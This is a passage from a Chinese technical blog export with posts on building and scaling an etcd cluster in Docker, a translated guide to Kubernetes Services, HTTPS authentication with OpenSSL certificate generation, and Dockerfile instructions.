http://0.0.0.0:2379,http://0.0.0.0:4001 \ -initial-advertise-peer-urls http://inf-platform55:2380 \ -listen-peer-urls http://0.0.0.0:2380 \ -initial-cluster-token etcd-cluster-1 \ -initial-cluster etcd0=http://inf-platform55:2380,etcd1=http://inf-platform56:2380,etcd2=http://inf-platform57:2380 \ -initial-cluster-state new 对其他的两台主机 inf-platform56,inf-platform57 进行相似的操作，注意要把 -name、-advertise-client-urls 和 -initial-advertise-peer-urls 分别改成对于主机的主机名。 注意事项 docker 的运行参数中一定要包含 –data-dir 参数，并且将 -data-dir指定的文件夹挂载了本机的一个目录下保存。否则当一个etcd挂了之后，如果再重新启动它，将不能重新加入到之前的集群中了。 启动这个集群 将三个主机上的etcd节点关联起来，搭建成一个集群，它们保持全局的key/value存储一致性，在任意三个主机的任意一个上输入： 1etcdctl -C http://inf-platform55:2379, http://inf-platform56:2379, http://inf-platform57:2379 member list 高可用的测试过程 这时候我们在 etcd 集群中的任意一台主机上输入： 1etcdctl member list 可以看到集群的节点情况，并能看出哪个是leader节点。如下图所示： 我们先在 inf-platform55 机子上设置一个key/value，如下所示： 我们可以在 inf-platform56、inf-platform57 主机上获取这个key/value，如下所示： 从 etcdctl member list 的结果可以看到 inf-platform55 这台机子是leader。这时候我们将这台机器上的etcd镜像停掉。即在这台机子上输入： 12docker stop e83ef052029e (这是etcd镜像的id)docker rm e83ef052029e 然后登录到 inf-platform56 机器上，输入 1etcdctl cluster-health 如图所示： 这时我们在 inf-platform56、inf-platform57 增加2个key/value存储： 12etcdctl set master http://inf-platform53etcdctl set registry http://inf-platform62 这时候因为 inf-platform55 已经挂掉，所以该机子上没有这2个key/value存储。过一段时间我们登陆 inf-platform55 这台机器重新运行 etcd 这个镜像，并查看这些 key/value 在这台机子挂掉的期间，新增的 key/value 仍然可以实现同步，这期间虽然发生了 leader 的选举变更，但保持了 key/value 的全局一致性，由此可见 etcd 搭建的集群是可以实现高可用的。 Etcd集群的扩展与收缩 etcd集群如果收缩很简单，直接在命令行输入 1etcdctl member remove $&#123;memberID&#125; $memberID 是你即将要删除节点的etcd的ID，etcd的扩展有一些地方需要注意一下，我在这里操作的时候遇到了不少坑。从上文写到现在，有一个文件夹很重要，几乎每个坑都与它有关，那就是-data-dir所声明的文件夹，注意要扩展一个etcd集群时，首先在集群内的任一台机器上输入 1etcdctl member add $etcd_name $peer_url $etcd_name：新加入的etcd节点的名字 $peer_url：一般为新加入的节点 IP:2380 这时候如果输入 1etcdctl member list 会出现 这时候登陆到待加入集群的那个节点上，启动这个etcd服务器。有几点需要注意的是：首先是把本机的data-dir文件夹删掉，然后是start.sh如下 12345678910111213docker run -d -v /home/work/docker/liuchang/etcd/ca-certificates/:/etc/ssl/certs \ -v /home/work/docker/liuchang/etcd/data-dir:/home/work/docker/etcd/data \ -p 4001:4001 -p 2380:2380 -p 2379:2379 \ --name etcd registry.abc.com/liuchang31/etcd:v2.3.7 \ -name etcd3 \ -data-dir /home/work/docker/etcd/data \ -advertise-client-urls http://inf-platform58:2379,http://inf-platform58:4001 \ -listen-client-urls http://0.0.0.0:2379,http://0.0.0.0:4001 \ -initial-advertise-peer-urls http://inf-platform58:2380 \ -listen-peer-urls http://0.0.0.0:2380 \ -initial-cluster-token etcd-cluster-1 \ -initial-cluster-state existing \ -initial-cluster etcd0=http://inf-platform55:2380,etcd1=http://inf-platform56:2380,etcd2=http://inf-platform57:2380,etcd3=http://inf-platform58:2380 把-initial-cluster-state 声明为existing，-initial-cluster-token要与之前的集群相同，并且在-initial-cluster中加入新的节点的IP:2380。如果启动失败多半是-data-dir文件的问题，将它删掉即可。]]></content>
      <tags>
        <tag>Etcd</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Kubernetes之Service]]></title>
    <url>%2F2016%2F06%2F20%2FKubernetes%E4%B9%8BService%2F</url>
    <content type="text"><![CDATA[在Kubernetes中Pod是终将消失的，从创建到销毁的过程中，它们是无法自动重启的。而ReplicationController可以用来动态的创建和销毁Pod（比如说在进行滚动升级的时候，可以进行扩展和收缩）。每一个Pod都得到一个属于自己的IP，但这些IP不能一直有效存在，因为这些IP随着Pod的销毁而变得没有了意义。那么这就导致了一个问题，如果一些Pods为集群内部的其他Pods（我们称它们为前端）提供服务，那么这些前端怎么发现、追踪这些后端集合中的服务呢？Service就是做这个事情的。 Service是一个抽象概念，它定义了一些逻辑上的Pods集合，并且定义了访问这些Pods集合的策略，也被称作为micro-service。Service通常通过Label标签选择器来对应相应的Pods集合（也有一些没有标签选择器的，请看下文介绍）。 举个例子，考虑一个运行的镜像，它在集群中有三个副本，这些副本是可以相互替代的，前端并不关心它现在与哪个后端服务打交道。实际上Pods组成的后端服务集合可以是变化的，比如说通过scale进行副本增加或者副本减少，但我们的前端不应该关心或者跟踪后端服务的变化，Service这一层抽象可以做到这一点。 对于常规的应用，Kubernetes提供了一个简单的Endpoints API，当Service中的Pods集合变化时，Endpoints 也会相应的做出变化。对于其他情况的应用，Kubernetes为Service提供了一个基于虚拟IP的网桥，这个网桥可以把前端的请求重定向到后端Pods中。 定义一个Service 在Kubernetes中，一个Service是一个REST对象，就像Pod一样。像所有的REST对象一样，将一个Service的定义发送给 apiserver 就可以创建一个相应的实例。例如，假设你有一系列的Pods都暴露9376端口，并且标签为&quot;app=MyApp&quot; 12345678910111213141516171819&#123; "kind": "Service", "apiVersion": "v1", "metadata": &#123; "name": "my-service" &#125;, "spec": &#123; "selector": &#123; "app": "MyApp" &#125;, "ports": [ &#123; "protocol": "TCP", "port": 80, "targetPort": 9376 &#125; ] &#125;&#125; 这个定义它会创建一个名叫&quot;my-service&quot;的Service实例，这个Service会与那些标签为&quot;app=MyApp&quot;的Pod相关联，并且关联这些Pods 9376端口上开启的TCP服务。这个Service会被分配一个IP地址（有时也被称作cluster IP），它被用来Service的代理。这个Service的标签会被持续的监控评估，并把结果以POST的形式传给一个Endpoints对象，也被称作&quot;my-service&quot;。 注意：Service能够把进入的端口映射成targetPort，默认情况下targetPort会设置成与port这个域相同的值。更有趣的是targetPort可以是一个string类型，与后端Pods端口的名字相关联（比如：http:80、https:443）。实际情况下，分配给每个名字的端口号在每一个Pod中都可能不同，这对于部署和升级自己的Service提供了更多的便利性。举个例子，你可以在不打断客户端的情况下改变下一版本后端服务暴露需要的端口号。Kubernetes的Service支持TCP和UDP，默认情况下是TCP。 在不带标签选择器的情况下定义Service Service通常用来抽象对Kubernetes中Pods集合的访问，但它们也能抽象成其他成其他种类的后端服务。举个例子： 在你的产品中想要有一个外部的数据库集群，但是想先用自己的数据库测试 你要想把这个服务指向另一个命名空间或者集群的服务 你想将一部分工作迁移至Kubernetes中，剩下的部分放在Kubernetes外部 在上面任一种情况下面，你通过定义一个不带标签选择器的Service来解决，就像下面的定义一样 12345678910111213141516&#123; "kind": "Service", "apiVersion": "v1", "metadata": &#123; "name": "my-service" &#125;, "spec": &#123; "ports": [ &#123; "protocol": "TCP", "port": 80, "targetPort": 9376 &#125; ] &#125;&#125; 由于这个Service没有标签选择器，所以相应的Endpoints对象就没有被创建，这种情况下你可以手动的创建 Endpoints 对象，并把这个Service映射与之关联起来。Endpoints 对象定义如下所示 1234567891011121314151617&#123; "kind": "Endpoints", "apiVersion": "v1", "metadata": &#123; "name": "my-service" &#125;, "subsets": [ &#123; "addresses": [ &#123; "ip": "1.2.3.4" &#125; ], "ports": [ &#123; "port": 9376 &#125; ] &#125; ]&#125; 注意：Endpoint 的IP可能不是回环地址（127.0.0.1）、Link-local网段（169.254.0.0/16）、Link-local多播地址（224.0.0.0/24）。通过标签选择器的Service与没有标签选择器的Service工作是一样的，这上述那例子中，流量会被用户定义的映射策略路由到Endpoints（1.2.3.4:9376）中。 虚拟IP和服务代理 在Kubernetes集群中的每一个Node节点都运行着一个Kube-proxy代理进程，这个进程负责为上面叙述的Service实现虚拟IP的功能。在Kubernetes 1.0版本中，这个proxy进程仅仅运行在用户空间，在Kubernetes 1.1版本中添加了Iptables代理功能，但这项功能并不是默认启用的，在1.2版本中，我们期望可以默认启用这项功能。 在1.0版本中，Service 是分三层（TCP/UDP Over IP）构建的，在1.1版本中 Ingress API 作为七层（HTTP）服务添加进去了。 代理模式：用户空间 在这种模式下，kube-proxy 进程监控着Kubernetes master进程对Service和Endpoint对象的增添操作。对于每一个Service，它在本地Node上随机选择一个端口打开，任何连接到这个“代理端口”的都会被转发到那些Service后端的Pod集合中（就像Endpoint中声明的）的某一个上，是Service的 SessionAffinity 策略来决定后端的哪一个Pod要被使用。最近的版本中安装了Iptables规则，这会抓取流向Service拥有的集群IP（Cluster IP）:port的流量，并且会把这些流量重定向到了这些后端Pod的代理端口上。 这种网络模式的情况下，在客户端不知道Kubernetes的Service和Pod的情况下，流向Service的IP:port的流量重定向到了合适的Pod后端上。默认情况下，选取哪个后端Pod来为前端Client服务是Round Robin策略。通过设置 service.spec.sessionAffinity 为 ClientIP（默认为None）可以选择基于 Session Affinity 的 ClientIP。代理过程就像下图所示： 代理模式：Iptables 在这种模式下，kube-proxy 进程监控着Kubernetes master 对 Service 和 EndPoints 对象的增删。对于每一个 Service 它安装一些iptables规则，能够抓取那些流向 Service 申明的 Cluster IP（实际上是虚拟的）端口的流量，并且能够把这些流量重定向到 Service 对应的后端集合中，而对于每一个EndPoints对象，它安装着一些iptables规则可以选择一个后端Pod来为前端请求服务。 默认情况下，选取哪个后端Pod来提供服务是随机的，可以通过设置 service.spec.sessionAffinity 字段为 ClientIP（默认为None）选择基于 ClientIP 的选取策略。 相比于用户空间的代理，在前端的请求并不知道任何Kubernetes、Service、Pods的情况下，任何流向 Service IP的流量，被代理到一个合适的后端服务上，这要比用户空间代理的模式要更加迅速和可靠。 基于多端口的 Service 许多 Service 需要暴露不止一个端口，对于这种情况下，Kubernetes支持在一个 Service 对象上定义多个端口。当使用多个端口的服务时，你必须声明每个端口的名字，只有这种情况下才能加以区分 EndPoints。比如： 1234567891011121314151617181920212223242526&#123; "kind": "Service", "apiVersion": "v1", "metadata": &#123; "name": "my-service" &#125;, "spec": &#123; "selector": &#123; "app": "MyApp" &#125;, "ports": [ &#123; "name": "http", "protocol": "TCP", "port": 80, "targetPort": 9376 &#125;, &#123; "name": "https", "protocol": "TCP", "port": 443, "targetPort": 9377 &#125; ] &#125;&#125; 自己为Service定义一个IP 你可以在Service描述中自己指定一个Cluster IP，而不需要集群自动为这个Service来指定一个Cluster IP。我们可以手动设置 spec.clusterIP 这一项。举个例子，如果你已经有了一个DNS条目并且你想替换掉它，或者遗留的系统配置了一个特定的IP并且难以被再次配置，都可以设置 spec.clusterIP。需要注意的是，用户指定的clusterIP必须是在API server指定的 service-cluster-ip-range 的CIDR范围内的，如果用户指定的IP不合法，那么API server就会传回一个HTTP 422状态码报错。 为什么不使用 round-robin DNS ？ 有一个问题不时的出现：为什么我们要做这些虚拟IP而不是使用标准的 round-robin DNS 策略，有以下几个原因： 这是DNS历史遗留问题，它的实现并不支持TTL以及缓存域名查询后的结果 许多应用程序只做一次DNS查询并缓存了这次查询的结果 即使如果应用程序或者DNS的实现支持了多次解析，那么这些DNS查询的反复请求，将变得难以管理 为了减少可能发生的错误，我们不建议用户使用上述策略，如果有很多用户建议我们增加对DNS的支持，那么我们也会在下次版本中增加这项支持。 查找Service 在Kubernetes中提供了两种方式查找一个Service : 环境变量 和 DNS。 环境变量 当一个Pod运行在一个Node上时，kubelet 会为每一个活跃的 Service 设置一系列的环境变量。它支持 Docker links compatible（详见 makeLinkVariables)和简单的变量定义，比如{SVCNAME}_SERVICE_HOST和{SVCNAME}_SERVICE_PORT变量定义，注意Service的名字是 大写的，并且 破折线要转成下划线。 举个例子：&quot;redis-master&quot;的Service暴露了TCP的6379端口，并且赋予了一个集群IP：10.0.0.11，那么它将生成下面环境变量： 1234567REDIS_MASTER_SERVICE_HOST=10.0.0.11REDIS_MASTER_SERVICE_PORT=6379REDIS_MASTER_PORT=tcp://10.0.0.11:6379REDIS_MASTER_PORT_6379_TCP=tcp://10.0.0.11:6379REDIS_MASTER_PORT_6379_TCP_PROTO=tcpREDIS_MASTER_PORT_6379_TCP_PORT=6379REDIS_MASTER_PORT_6379_TCP_ADDR=10.0.0.11 需要注意的是：这里面有一个顺序要求，如果一个Pod想要访问一个Service，那么Service必须要早于Pod被创建，因为只有Service创建了，环境变量才被创建，但DNS就没有此限制。 DNS 一个可选的集群插件（强烈的推荐）是一个DNS服务器，这个DNS服务器会通过监视创建Service的Kubernetes API的调用，并且会为每一个Service创建一个DNS条目。如果DNS工作了，那么集群中的所有Pods就可以通过DNS的域名解析来自动的发现 Service了。 举个例子：如果你在Kubernetes的&quot;my-ns&quot;命名空间里，有一个叫&quot;my-service&quot;的Service，那么相应的就会为&quot;my-service.my-ns&quot;创建一个DNS记录。在&quot;my-ns&quot;命令空间的Pods节点就可以通过DNS域名查询&quot;my-service&quot;找到，而其他命令空间的Pods必须加上命名空间的修饰符，就像&quot;my-service.my-ns&quot;一样，域名查询的结果就是Cluster IP。 Kubernetes同样支持端口的DNS记录查询，如果&quot;my-service.my-ns&quot;的Service有一个TCP端口命名为&quot;http&quot;，你可以通过查询&quot;_http._tcp.my-service.my-ns&quot;去查找到这个对于的端口号码。 Headless（无源的） Service 有时候你并不需要一个单独的ServiceIP或者负载平衡策略，在这种情况下，你可以设置Cluster IP（spec.clusterIP）为&quot;None&quot;来创建一个Headless（无源的） Service。 对于这种类型的Service，并不会分配一个Cluster IP给它，DNS为这种服务名返回多条A记录，并且直接把Pods指向相应的Service。此外 kube proxy 进程也不处理这类Service，并且没有了负载平衡以及平台为它们提供的代理服务，但是 EndPoints 控制器仍然会为这类Service创建相应的 EndPoints 对象。 这种选项允许开发者们减少了与Kubernetes系统的联系，甚至是他们愿意的情况下，以自己的方式实现Service的发现方式也是可以的。对于其他Service的发现方式，应用程序可以很方便的使用内建的API，采用自注册模式和接口来实现。 公开你的Service 对于某些应用（比如是前端），你可能想把这个Service赋予一个外部IP地址暴露出去（在集群的外部，甚至是互联网），而其他的服务只能在集群内部可见。 可以通过设置Kubernetes的ServiceTypes域来定义一种你想要的服务类型，缺省的、最基本的类型是Cluster IP，这种类型的服务仅仅只能在集群内部可见。NodePort和LoadBalancer这两种类型的服务可以将服务暴露到集群外部。对于ServiceTypes域的有效值为： ClusterIP：仅仅使用集群内部的IP，这是缺省的方式，也正是上述描述的那样。选择这个值也就意味着，你的这个Service仅仅只能从集群内部访问到。 NodePort: 拥有一个集群内部的IP，并且将这个服务暴露在集群上的每一个节点上的某一端口上，你可以通过访问任意NodeIP:NodePort的方式来访问这个服务。 LoadBalancer: 拥有一个集群内部的IP，也暴露在一个NodePort端口上。它要求云提供商提供一个负载均衡器的地址，任意NodeIP:NodePort的地址都会转发到这个负载均衡器上。 NodePort类型 如果你把ServiceTypes域设置成NodePort类型，Kuberbetes的master会从经过设置的端口范围内（缺省是30000-32767）分配一个端口给它，并且每一个Node节点将这个端口代理到你的Service，这个端口号可以通过Service的spec.ports[*].nodePort域查询出来。 如果你想要一个特定的端口号，你必须在nodePort域指定一个值，那么系统将会为你分配一个端口号，或者API调用失败（你可能要考虑端口碰撞的可能性），这个值必须在你配置的端口号范围内。 这给开发者们设置自己的负载平衡器，配置那些并不能Kubernetes完全支持的云环境，甚至是直接暴露一个或者更多node节点的IP提供了自由。注意Service将会在NodeIP:spec.ports[*].nodePort和spec.clusterIp:spec.ports[*].port指明的端口可见。 LoadBalancer类型 云提供商提供一个外部的负载均衡器，通过设置&quot;ServiceTypes&quot;域为LoadBalancer将会为你的Service提供一个负载均衡器。实际上负载均衡器的创建过程是异步的，可以通过查看Service的status.loadBalancer域来查看负载均衡器的状态信息。举个例子： 1234567891011121314151617181920212223242526272829303132&#123; "kind": "Service", "apiVersion": "v1", "metadata": &#123; "name": "my-service" &#125;, "spec": &#123; "selector": &#123; "app": "MyApp" &#125;, "ports": [ &#123; "protocol": "TCP", "port": 80, "targetPort": 9376, "nodePort": 30061 &#125; ], "clusterIP": "10.0.171.239", "loadBalancerIP": "78.11.24.19", "type": "LoadBalancer" &#125;, "status": &#123; "loadBalancer": &#123; "ingress": [ &#123; "ip": "146.148.47.155" &#125; ] &#125; &#125;&#125; 来自于外部负载均衡器的流量会直接转发到后端的Pods上，如何精确的工作要取决于云提供商。一些云提供商允许指定负载均衡器的外部IP，在这种情况下将会创建一个用户指定loadBalancerIP的负载均衡器。如果loadBalancerIP域没有被指定，就会给这个负载均衡器指定一个短暂的IP地址，如果指定了这一项，但是云提供商并不支持这一个特性，那么这一项将会被忽略。 外部的IP Kubernetes的Service可以暴露在一些外部Ip上，如果这些外部IP路由到一个或多个集群节点上。这些通过外部IP的并且目标端口是Service Port的流量，将会被路由到Service相对应的endPoints集合中的某一个，实现负载均衡。Kubernetes本身并不管理这些外部IP（externalIPs）的，它是由集群的管理员管理的。 在Service的描述文件的externalIPs域，并不局限于ServiceTypes域的设定。在下面一个例子中，my-service可以通过**80.11.12.10:80（外部IP:端口）**访问。 1234567891011121314151617181920212223&#123; "kind": "Service", "apiVersion": "v1", "metadata": &#123; "name": "my-service" &#125;, "spec": &#123; "selector": &#123; "app": "MyApp" &#125;, "ports": [ &#123; "name": "http", "protocol": "TCP", "port": 80, "targetPort": 9376 &#125; ], "externalIPs" : [ "80.11.12.10" ] &#125;&#125; 缺点 对于VIPs，使用用户空间代理的模式只能应用于小到中型的集群，很难扩展到拥有数以千计的Service的大集群，详情参考：the original design proposal for portals。 使用用户空间代理这种模式，掩盖了访问一个Service的Packet的源IP，这会导致一些防火墙措施失效。IP代理虽然并没有掩盖集群的源IP，但它仍然影响了那些来自于负载均衡器或者nodePort的客户端。 类型Type字段被设置成嵌套模式，每一级别都可以添加到前一个级别上。这对于所有的云提供商（比如说，Google Compute Engine并不需要分配一个NodePort来使得负载均衡器工作，但是AWS需要如此）并不是严格要求的，但是对于当前的API来说是必须的。 未来的工作 未来我们希望代理策略比简单的round robin均衡策略更加细致入微，比如说master-elected或者sharded。我们还在设想一些Services将会成为真正的负载均衡器，这种情况下，VIP只是简单的传输报文就行了。我们打算提升对Service第七层（HTTP）的支持，对于Service的访问接入机制，我们还有很多更加灵活的模型，这涉及到了当前的Cluster IP，NodePort，负载均衡器等等。 总结：关于虚拟IP的一些细节 对于那些仅仅想使用Service的用户来说，上文的描述已经足够了。然而，在这些实现的背后还有很多值得学习的东西。 碰撞避免 Kubernetes设计的一个首要哲学就是：用户本身没有错误的情况下而导致行为的失败，这种情形不应该暴露给用户。我们正在寻找一个网络端口，如果端口选择可能与另一个用户发生碰撞，那么用户就不应该去选择这个端口，而是交给Kubernetes来选择，这是一个孤立的错误。 为了让用户可以自己为Service选择一个端口，我们必须确定没有2个Service发生碰撞。我们可以为每个Service分配IP地址来实现这一点。 为了确保每一个Service分配了唯一的IP地址，集群内部的IP分配器必须在etcd中自动的更新全局的IP分配图。Service为了得到一个IP，它必须存在IP分配图的注册表中，否则将返回IP不能被分配的报错。后台控制器负责创建这个IP分配图（从老版本的Kubernetes中迁移来的，使用的是内存锁定），同时也检查那些无效的IP分配，从而管理员干预和清理那些已经分配的但目前没有Service在使用的IP。 IP 和 VIP 不同于Pod的IP地址，Pod的IP地址路由到一个固定的目的地上，而Service的IP事实上不是由单台主机回应。相反的，我们使用iptables（Linux的包过滤程序）去定义那些需要重定向的虚拟IP地址。当客户端连接这些虚拟IP（VIP）时，它们的流量会自动的传输到一个合适的endPoint上。根据Service的VIP和Port情况，环境变量和DNS条目会自动的更新。 我们支持两种代理模式：用户空间模式和iptables代理模式，它们之间有稍微不同之处。 用户空间 举个例子，考虑上面描述的一个镜像的处理过程，当后端的Service创建之后，Kubernetes将会分配给它一个虚拟的IP地址，比如说是10.0.0.1。假设Service的端口是1234，这个Service就会被集群中的所有kube-proxy进程注意到。当一个proxy看到一个新的Service的时候，它会打开一个随机的端口，并且建立一条iptables规则用于重定向这个VIP（虚拟IP）到这个新的随机的端口，最后在这上面开始接受外来的连接。 当一个客户端连接到这个VIP时，iptables规则会重定向这个报文到Service自己的端口上，Service代理就会选择一个后端Pod，开始代理这些从客户端到后端的流量。 这意味着Service可以随意的选择端口而不用考虑端口碰撞的情况，客户端也能简单的连接到一个IP和端口上，而不用考虑哪个后端Pod为之服务。 Iptables 再一次考虑上述描述的那个过程，当后端服务创建之后，Kubernetes master会分配一个虚拟的IP地址，举个例子是10.0.0.1。假设Service的端口是1234，这个Service会被集群上的所有kube-proxy进程所发现。当一个proxy看到这个新Service的时候，它会生成一个iptables规则把VIP重定向到Service。每一个Service到EndPonit的规则，通过目的地址NAT修改重定向到了后端Pod中。 当一个客户端连接到VIP时，会选择一个后端（或者依赖session affinity随机选择），并且将报文重定向到后端。不像用户空间代理模式，报文从来不用拷贝到用户空间。kube-proxy进程不需要运行，VIP策略也可以工作，并且客户端的IP地址是不会被改变的。 尽管在一些条件下客户端的IP确实改变了，但当流量通过nodePort或者负载均衡器时，基本的执行流是相同的。 API对象 在Kubernetes REST API中，Service是一个顶层的资源类型，更多关于API的细节，参考Service API object. 最后 花了好久终于把这篇文章翻译好了…英语表达能力差，翻译也不是那么好做的…因为感觉Service很经常接触到，所以翻译了这篇文章。原文地址：http://kubernetes.io/docs/user-guide/services/]]></content>
      <tags>
        <tag>kubernetes</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[浅谈HTTPS认证]]></title>
    <url>%2F2016%2F06%2F13%2F%E6%B5%85%E8%B0%88HTTPS%E8%AE%A4%E8%AF%81%2F</url>
    <content type="text"><![CDATA[在学习kubernetes的过程中，关于监控部署这一部分中涉及到了HTTPS方面的知识。以前曾经在Web安全实践这门课上了解过这方面的知识，如今需要再详细的梳理一下HTTPS的认证过程。 HTTP VS HTTPS 因特网早期的很多东西在设计方面都没有考虑安全方面的因素，HTTP协议就是一个鲜明的例子。HTTP采用的明文传输的，如果我们使用wireshark抓包工具，可以很轻易的嗅探一些信息。 HTTPS在HTTP的基础上增加了安全方面的考虑，主要分为2个过程。 使用RSA加密算法来进行身份认证以及协商加密算法和秘钥 使用协商后的加密算法进行数据传输 HTTPS的身份认证 这里的身份认证分为2类，大多数情况下都是客户端需要验证服务端的身份，在政府以及银行一些领域，服务端也需要验证客户端的身份，这身份认证过程中使用的是RSA加密算法。 RSA加密算法 RSA加密算法是一种非对称加密算法，加密和解密的钥匙是不同的，所以被称为非对称加密算法。它有2种秘钥，分为公钥和私钥，公钥任何人都可以查到的，而私钥属于私人保管。这种加密体系下，私钥加密的的密文只有公钥可以解开，所以私钥可以用来签名；而公钥加密的密文只有私钥可以解开，它可以用来加密传输。 在密码学中，很多加密算法都来源于一个数学难题，没错RSA算法的原理也来自于数论领域中的大数难于被质因分解的问题。它的秘钥生成过程大致如下： 选取2个非常大的质数 p 和 q ，而 n = p * q 随机选取一个数 e1 ，但要求 e1 与 (p-1) * (q-1) 互质 再选择 e2 ，e2 是 e1 关于 (p-1) * (q-1)的模逆 (n, e1) 和 (n, e2) 即是我们的公私钥 注意 e1 和 e2 要相距较远，不然暴力很容易求解这一对秘钥。假如 (n, e1) 是公钥，待加密的明文为 0x4089 那么加密后的密文为 X 为： X = 0x4089 ^ e1 mod n 解密过程为 ： X ^ e2 mod n = 0x4089 大致了解了RSA加密算法的原理，那怎么应用到HTTPS中的呢？为了进行服务端或者客户端的认证，我们需要生成一个证书。 使用OpenSSL生成证书 关于认证方面的事情一般都需要个第三者，为了验证某个人身份的合法性，我们需要向一个公信力非常强的组织求证。在HTTPS中，CA 就是这个第三者，它会给一个公司或者组织颁发一个证书，为了获取这个证书，公司或者组织往往要交一大笔费用的。 在12306的网站中，就是没有 CA 认证的证书，所以每次访问的时候，都要手动点击信任。为了测试使用，我们自己生成一个 CA ，用来认证自己颁发的证书。首先我们生成一个2048位的 CA 私钥 ca.key # openssl genrsa -out ca.key 2048 通过私钥 ca.key 可以生成公钥 ca.csr # openssl rsa -in ca.key -pubout -out ca.csr 然后我们用 ca.key 来颁发 CA 的证书 ca.crt # openssl req -x509 -new -nodes -key ca.key -subj "/CN=baidu.com" -days 5000 -out ca.crt 其他人可以根据 CA 的公钥 ca.csr 来解密解密这个证书进行验证 CA 的身份。因为 CA 的证书是通过 ca.key 来颁发的，也就是说这个证书上有 CA 的签名，我们使用 CA 的公钥 ca.csr 就可以解密这个证书，来验证这个 CA 证书的有效性。 同理，为了让我们的公司或者组织可以被其他人信任，我们需要让 CA 给我们的公司或者组织颁发一个证书。首先我们先自己生成一个公私钥对 # openssl genrsa -out server.key 2048 # openssl req -new -key server.key -subj "/CN=lecury.cn" -out server.csr 我们把生成后的私钥 server.key 自己保管，公钥 server.csr 交给 CA ，为我们制作证书 server.crt # openssl x509 -req -in server.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out server.crt -days 5000 HTTPS中对服务端的验证 在一些HTTPS网站中，在进行通信前，客户端和服务端的双方需要一些身份认证。大部分的情况下，客户端需要对服务端进行验证，过程如下： 服务端将自己的证书发给客户端（浏览器） 客户端（浏览器）向本地的 CA 求证服务端的证书信息是否合法，即用CA的公钥来解密服务端证书的内容 若验证成功之后，会提取出服务端证书中的服务端的公钥，用这个公钥来加密信息（自己支持的加密算法以及秘钥） 服务端收到之后，利用私钥解开，协商一种加密算法，然后利用此算法进行数据传输过程中的加密。 在HTTPS过程中RSA加密算法用来对双方身份信息的验证，因为RSA为非对称加密算法，加密效率相对低下，所以在实际进行数据传输的过程中，采用的一般是对称加密算法比如说DES等。 对客户端的认证 服务端请求对客户端身份信息的验证，这种情况一般发生在政府或者银行的网站上。一般的解决办法是网银盾或者是USBkey，客户端的证书保存在服务端那里，由服务端来验客户端身份的有效性。 总结 HTTPS是因特网安全领域的一个重要变现，它广泛的应用在了各个网站的身份认证中，了解一下它的基本原理还是非常有必要的。]]></content>
      <tags>
        <tag>网络</tag>
        <tag>HTTPS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Dockerfile简介]]></title>
    <url>%2F2016%2F06%2F03%2FDockerfile%E7%AE%80%E4%BB%8B%2F</url>
    <content type="text"><![CDATA[Dockerfile类似于Linux中的Makefile，Docker用它来快速便捷的创建一个镜像。本文介绍一下Dockerfile的编写规则，以及一些常见的Dockerfile样例。 Dockerfile的基本结构 Dockerfile指令是不区分大小写的，为了便于区分建议使用大写，它使用’#'作为注释。Dockerfile由一条条指令构成的，一般来说它由基础镜像信息、维护者信息、镜像操作指令和容器启动指令（可选）构成的。例如： # FROM说明此镜像是来源于centos这个基础镜像的 FROM centos # MAINTAINER指明了这个镜像的维护者的信息 MAINTAINER liuchang liuchang31@baidu.com # RUN代表要在该基础镜像centos上添加一些操作 RUN mkdir -p /time_server/log/ && mkdir -p /time_server/bin/ # COPY 表明要把主机当前目录下的文件复制一份到镜像的/time_server/bin/目录中 COPY . /time_server/bin/ # WORKDIR 指明当前镜像的工作目录 WORKDIR /time_sevre/bin/ # CMD 指明镜像运行时要启动的命令 CMD ./time_server Dockerfile的指令 FROM FROM < image > 或 FROM < image >:tag Dockerfile第一条指令必须为FROM，如果一个镜像需要多个基础镜像的话可以使用多个FROM MAINTAINER # 指定维护者信息。 MAINTAINER < name > RUN # 等价于 /bin/sh -c RUN < command > 或 # 使用 exec 执行 RUN ["executable", "param1", "param2"] 指定使用其它终端可以通过第二种方式实现，例如 RUN ["/bin/bash", "-c", "echo hello"] 每条 RUN 指令将在当前镜像基础上执行指定命令，并提交为新的镜像。当命令较长时可以使用 \ 来换行。 CMD # 使用 exec 执行，推荐方式 CMD ["executable","param1","param2"] # 在 /bin/sh 中执行，提供给需要交互的应用 CMD command param1 param2 # 提供给 ENTRYPOINT 的默认参数 CMD ["param1","param2"] 指定启动容器时执行的命令，每个 Dockerfile 只能有一条 CMD 命令。如果指定了多条命令，只有最后一条会被执行。 如果用户启动容器时候指定了运行的命令，则会覆盖掉 CMD 指定的命令。 ENTRYPOINT ENTRYPOINT ["executable", "param1", "param2"] # shell中执行 ENTRYPOINT command param1 param2 配置容器启动后执行的命令，并且不可被 docker run 提供的参数覆盖。 每个 Dockerfile 中只能有一个 ENTRYPOINT，当指定多个时，只有最后一个起效。 EXPOSE EXPOSE < port > [< port >...] 告诉 Docker 服务端容器暴露的端口号，供互联系统使用。在启动容器时需要通过 -P，Docker 主机会自动分配一个端口转发到指定的端口。 ENV 指定镜像的环境变量信息，ENV &lt; key &gt; &lt; value &gt; 的形式，例如： ENV PG_MAJOR 9.3 ENV PG_VERSION 9.3.4 RUN curl -SL http://example.com/postgres-$PG_VERSION.tar.xz | tar -xJC /usr/src/postgress && … ENV PATH /usr/local/postgres-$PG_MAJOR/bin:$PATH ADD 格式为 ADD &lt; src &gt; &lt; dest &gt;。 该命令将复制指定的 到容器中的 。 其中 可以是Dockerfile所在目录的一个相对路径；也可以是一个 URL；还可以是一个 tar 文件（自动解压为目录） COPY COPY < src > < dest > 复制本地主机的 （为 Dockerfile 所在目录的相对路径）到容器中的 。 当使用本地目录为源目录时，推荐使用 COPY。 VOLUME VOLUME /data 创建一个可以从本地主机或其他容器挂载的挂载点，一般用来存放数据库和需要保持的数据等 USER Docker镜像默认运行的是root用户，如果要以其他用户来运行此镜像就需要USER来指定一个用户。 USER daemon 指定运行容器时的用户名或 UID，后续的 RUN 也会使用指定用户。 当服务不需要管理员权限时，可以通过该命令指定运行用户。并且可以在之前创建所需要的用户，例如： RUN groupadd -r postgres && useradd -r -g postgres postgres。 要临时获取管理员权限可以使用gosu，而不推荐 sudo。 WORKDIR WORKDIR /path/to/workdir 为后续的 RUN、CMD、ENTRYPOINT 指令配置工作目录。 可以使用多个 WORKDIR 指令，后续命令如果参数是相对路径，则会基于之前命令指定的路径。例如 WORKDIR /a WORKDIR b WORKDIR c RUN pwd 则最终路径为 